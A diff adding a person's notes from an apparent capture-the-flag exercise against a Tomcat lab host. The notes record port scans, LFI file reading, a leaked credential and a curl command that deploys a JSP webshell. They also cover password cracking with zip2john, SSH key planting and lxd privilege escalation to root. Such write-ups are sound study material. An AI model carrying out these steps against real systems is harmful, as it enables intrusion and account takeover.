@@ -1,0 +1,63 @@
+OS:
+- Linux
+
+Open Ports:
+- PORT     STATE SERVICE VERSION
+- 22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+- | ssh-hostkey:
+- |   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
+- |   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
+- |_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
+- 80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+- |_http-server-header: Apache/2.4.41 (Ubuntu)
+- |_http-title: Mega Hosting
+- 8080/tcp open  http    Apache Tomcat
+- |_http-title: Apache Tomcat
+
+
+- enumerating port 80
+- found LFI vulnerability in /news.php
+- looking for local files
+- finding tomcat 9 config files
+/usr/share/tomcat9/etc/tomcat-users.xml
+
+- found creds:
+tomcat:$3cureP4s5w0rd123!
+
+- tried signing into http://10.10.10.194:8080/manager/html with creds
+- did not work
+
+- looking for tomcat upload directory for apps
+wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404
+http://10.10.10.194:8080/manager/FUZZ
+
+- got jsp webshell
+- converted to war file
+- uploaded to tomcat:
+curl -T cmdjsp.war -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/shell
+
+- accessing webshell
+- had issues getting reverse shell
+- was able to by outputting reverse shell cmd to file and then executing file
+- found backup file in web directory
+- copy to loca machine
+- password protected
+- zip2john to crack password
+password: admin@it
+- unzip folders
+- nothing of interest
+- su to ash using same password as zip
+- logged in as user
+- tried ssh to user ash using password
+- requires ssh cert
+- generated ssh key pair
+- copied public key to authorized_keys
+- copied private key to local
+- ssh as ash
+- running priv esc scripts
+- lxd containers is installed, user is part of group
+- following steps here for priv esc: https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation
+
+- got root access within container
+- went to /mnt/root/
+- root flag
